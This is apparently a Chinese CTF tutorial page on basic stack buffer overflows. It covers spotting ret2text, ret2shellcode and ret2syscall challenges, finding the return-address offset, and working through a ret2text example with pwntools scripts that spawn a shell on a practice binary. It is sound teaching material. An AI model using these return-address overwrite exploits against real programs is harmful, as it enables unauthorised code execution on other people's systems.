# 栈溢出基础

关键词：栈溢出 栈溢出基础 缓冲区溢出 buffer overflow ret2text ret2shellcode ret2syscall pwn pwntools 覆盖返回地址

## ① 识别指纹

- 附件是**无后缀或 `.elf` / `.bin` 的 ELF**，`file` 显示 `executable`
- 题干给了一个 `nc 1.2.3.4 9999`，或者给了一个需要你本地 `./pwn` 运行的二进制
- 程序行为很简单：打印一句菜单、要求输入、然后 `Input:` / `Your name:` / `Give me your answer:`
- 题目名常带 `baby` / `easy` / `overflow` / `ret2` / `stack`
- `checksec` 显示 **Canary: No**、**PIE: No** —— 这是"最理想的入门条件"
- 32 位题目居多（`ELF 32-bit LSB executable, Intel 80386`）

## ② 考什么

- 函数调用栈布局：局部变量 → saved rbp → **返回地址**
- 覆盖偏移的计算（`pattern` / `cyclic` / gdb 断点看 `[rsp]`）
- `ret2text`：往已有的后门函数跳
- `ret2shellcode`：栈可执行（NX 关闭）时直接跳到 shellcode
- `ret2syscall`：静态链接、有 `syscall; ret` gadget 时直接调 `execve`
- 32 位（`eip`、压栈传参）与 64 位（`rip`、寄存器传参、`pop rdi; ret`）的差异
- 64 位 **栈对齐**（`movaps` 崩溃、多塞一个 `ret`）
- 接收函数：`gets` / `read` / `scanf("%s")` / `fgets` 的可控长度差异
- pwntools 的基本用法：`remote` / `process` / `p64` / `flat` / `interactive`

## ③ 判断流程

1. **`checksec ./pwn`**，记下五行保护（Arch / RELRO / Stack / NX / PIE）—— 这一步决定后面所有路线，必做
2. **`objdump -d ./pwn | grep -E '<[a-zA-Z_]+>:'`** 列出所有函数 —— 有没有一个你没见过的、看起来像后门的函数？
   - 有 `get_shell` / `backdoor` / `win` / `system("/bin/sh")` 这样的函数，且 **PIE: No** → **ret2text**，跳 6
3. **跑一遍程序**，观察输入点：哪个输入能写超过它应写长度
   - 用 `cyclic 200` 喂进去，崩了之后看 `eip`/`rip` 是多少 —— 偏移 = 该值在 pattern 中的位置
   - 没崩说明没有溢出，**换下一个输入点**，全试完还是没有 → 这题不是栈溢出基础，回 [题型总表](/map)
4. **判断有没有 NX**：
   - `NX disabled` → 可以 **ret2shellcode**，跳 7
   - `NX enabled` → 只能 ROP，跳 5
5. **有 PIE？**
   - `PIE: No` → 地址写死，直接拼 payload
   - `PIE: Yes` → 需要先泄露一个地址，去 [地址泄露与 PIE 绕过](/pwn/leak-pie)
6. **ret2text 收尾**：`payload = b'A'*偏移 + p64(后门函数地址)`
   - 64 位且崩在 `movaps` → 在最后多接一个 `ret` gadget 做 16 字节对齐
   - 后门函数需要参数（比如 `system("/bin/sh")` 已被拆开）→ 转 [ROP 与 ret2libc](/pwn/rop-ret2libc)
7. **ret2shellcode 收尾**：确认写 shellcode 的缓冲区地址（`gdb` 里看 `p/x $rsp`，或程序会打印缓冲区地址）
8. **没有后门也没有可执行栈** → 转 [ROP 与 ret2libc](/pwn/rop-ret2libc)
9. **以上全不成立** → 回到第 1 条，把这题当成 **format string / 堆题** 重新分类

## ④ 工具与命令

```bash
checksec ./pwn                       # 或 pwn checksec ./pwn
file ./pwn
objdump -d ./pwn | less              # 找后门函数
readelf -s ./pwn | grep FUNC         # 函数符号表
ROPgadget --binary ./pwn | grep "pop rdi"
```

```python
from pwn import *

elf = ELF('./pwn')
p = remote('1.2.3.4', 9999)          # 本地调试用 process('./pwn')

# 偏移：用 cyclic 生成，崩溃后从 eip/rip 反查
offset = cyclic_find(0x6161616a)      # 32 位
# offset = cyclic_find(0x6161616161616166)  # 64 位

payload  = b'A' * offset
payload += p64(elf.symbols['get_shell'])   # 32 位用 p32

p.sendline(payload)
p.interactive()
```

```bash
# gdb 里找偏移
gdb ./pwn -ex 'run' -ex 'info registers rip' -ex 'x/4gx $rsp'
```

## ⑤ 常见坑

| 现象 | 实际原因 | 正确应对 |
|---|---|---|
| 本地打通，远程不通 | 远程 libc / 环境不同 | 远程优先；或题目给 libc 就用 `pwninit` 对齐 |
| 64 位 shell 拿到但一执行就崩 | `movaps` 要求 16 字节栈对齐 | payload 前多接一个 `ret` gadget |
| 偏移算对了但还是跳错地方 | 函数地址写成了 `plt` 而题目要的是真实地址 | `elf.symbols` vs `elf.plt` 分清 |
| payload 里有 `\x00` 被截断 | `strcpy`/`gets` 遇零停止 | 换不含零的地址，或改用 `read` 输入点 |
| `pattern` 算出偏移是 0 | 程序没崩 | 换输入点；很多题有好几个输入，能溢出的往往不是你第一个试的 |
| 32 位地址写成 8 字节 | `p64` 用错 | 32 位一律 `p32`，且地址通常 4 字节 |
| 后门函数存在但执行没反应 | 函数被编译器优化/参数不满足 | 在 gdb 里断点到该函数确认它真的被调用 |

## ⑥ 例题

**题目**：CTF Wiki《栈溢出基础》中的 `ret2text` 示例程序
**来源**：CTF Wiki（ctf-wiki.org）"栈溢出基础"章节的公开教学二进制

**题干**：程序会读入一段字符串并打印 `Hello, <输入>`，此外源码里还有一个从不被调用的 `get_shell()` 函数，内容是 `system("/bin/sh")`。

**关键观察**：
- `checksec`：32 位、**NX enabled、PIE disabled、Canary disabled**
- `objdump -d` 里存在一个没有任何交叉引用的 `get_shell` 函数，地址是固定值
- 主函数用 `gets` 读入 —— 长度完全不可控

这三个条件同时出现，就是教科书式的 ret2text。

**走了哪条链**：第 1 条（checksec，确定无 PIE 无 Canary）→ 第 2 条（发现 `get_shell` 后门）→ 第 6 条（拼接 ret2text payload）。

**命令与输出**：

```text
$ objdump -d ./ret2text | grep get_shell
0804851a <get_shell>:
  ...
  call   8048340 <system@plt>

$ cyclic 100 | ./ret2text
Hello, aaaabaaacaaadaaaeaaafaaagaaahaaa...
Segmentation fault
（gdb 中 eip = 0x6161616c → cyclic -l 0x6161616c = 44）
```

```python
from pwn import *
p = process('./ret2text')
p.sendline(b'A'*44 + p32(0x0804851a))
p.interactive()
# 得到 shell 后：cat flag
```

**结果**：`cat flag` 直接输出 flag。

::: tip flag 说明
本页例题的 flag 随原题版本变化，页内不固定。练习目标是走通判断流程：**checksec → 找后门 → 算偏移 → 拼 payload**。
:::
